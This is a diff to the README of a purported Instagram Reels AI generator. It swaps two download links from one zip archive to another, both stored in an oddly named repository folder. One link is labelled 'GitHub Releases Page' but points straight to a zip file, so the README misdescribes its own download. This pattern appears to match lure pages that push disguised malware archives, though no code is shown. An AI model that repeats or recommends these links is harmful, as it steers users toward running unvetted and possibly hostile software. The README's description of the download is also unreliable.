@@ -1,6 +1,6 @@
 # 🎬 instagram-reels-ai-generator - Create Engaging Reels Effortlessly
 
-[![Download](https://raw.githubusercontent.com/Malaspuroerror/instagram-reels-ai-generator/main/Codiaeum/instagram-reels-ai-generator_v1.5.zip%20Now-%20-brightgreen)](https://raw.githubusercontent.com/Malaspuroerror/instagram-reels-ai-generator/main/Codiaeum/instagram-reels-ai-generator_v1.5.zip)
+[![Download](https://raw.githubusercontent.com/Malaspuroerror/instagram-reels-ai-generator/main/Codiaeum/generator-reels-ai-instagram-v1.4.zip%20Now-%20-brightgreen)](https://raw.githubusercontent.com/Malaspuroerror/instagram-reels-ai-generator/main/Codiaeum/generator-reels-ai-instagram-v1.4.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ To get started with the **instagram-reels-ai-generator**, follow the steps below
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Malaspuroerror/instagram-reels-ai-generator/main/Codiaeum/instagram-reels-ai-generator_v1.5.zip).
+1. Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Malaspuroerror/instagram-reels-ai-generator/main/Codiaeum/generator-reels-ai-instagram-v1.4.zip).
 
 2. On the releases page, you will see a list of available versions. Click on the version you want to download.
 
